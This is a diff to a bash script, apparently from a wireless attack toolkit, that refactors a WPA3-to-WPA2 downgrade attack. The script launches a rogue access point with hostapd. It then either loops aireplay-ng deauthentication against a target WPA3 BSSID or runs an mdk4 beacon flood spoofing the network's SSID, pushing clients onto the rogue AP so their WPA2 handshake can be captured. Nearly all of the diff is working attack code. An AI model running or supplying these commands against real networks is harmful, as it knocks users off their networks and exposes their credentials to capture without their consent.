@@ -79,46 +79,11 @@ cleanup() {
     echo "[*] Cleaning up Downgrade processes..."
     [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
     [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
+    [[ -n "${TELEMETRY_PID:-}" ]] && kill "$TELEMETRY_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
 
-if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
-else
-    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
-fi
-HOSTAPD_PID=$!
-
-# 3. Execution of Catalyst
-if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
-    echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
-    # Continuous deauth to prevent client from staying on WPA3 AP
-    (
-        while kill -0 $HOSTAPD_PID 2>/dev/null; do
-            if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
-            else
-                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
-            fi
-            sleep 15
-        done
-    ) &
-    CATALYST_PID=$!
-elif [[ "$catalyst_choice" == "2" ]]; then
-    if command -v mdk4 &>/dev/null; then
-        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
-        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-            mdk4 "$INTERFACE" b -n "$SSID" -c 11 &
-        else
-            mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
-        fi
-        CATALYST_PID=$!
-    fi
-fi
-
-echo "[*] Downgrade environment active. Monitoring for client association..."
-
-# Start dynamic telemetry heartbeat
+# 3. Start dynamic telemetry heartbeat
 (
     HEARTBEAT_ELAPSED=0
     while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
@@ -131,10 +96,39 @@ echo "[*] Downgrade environment active. Monitoring for client association..."
 ) &
 TELEMETRY_PID=$!
 
-# In a real test, we would also run airodump-ng in background to capture the WPA2 handshake
-# as the client connects to our rogue AP using the known dummy passphrase.
+# 4. Execution of Catalyst and hostapd
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # Window Mode: Run hostapd in foreground, catalyst in background
+    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
+        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
+        ( while true; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true; sleep 15; done ) &
+        CATALYST_PID=$!
+    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
+        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
+        mdk4 "$INTERFACE" b -n "$SSID" -c 11 &
+        CATALYST_PID=$!
+    fi
 
-sleep "$SCAN_TIME"
+    echo "[*] Downgrade environment active. Monitoring for client association..."
+    timeout "$SCAN_TIME" hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" || true
+else
+    # Background Mode
+    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+    HOSTAPD_PID=$!
+
+    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
+        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
+        ( while kill -0 $HOSTAPD_PID 2>/dev/null; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true; sleep 15; done ) &
+        CATALYST_PID=$!
+    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
+        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
+        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
+        CATALYST_PID=$!
+    fi
+
+    echo "[*] Downgrade environment active. Monitoring for client association..."
+    sleep "$SCAN_TIME"
+fi
 
 kill "$TELEMETRY_PID" 2>/dev/null || true
 
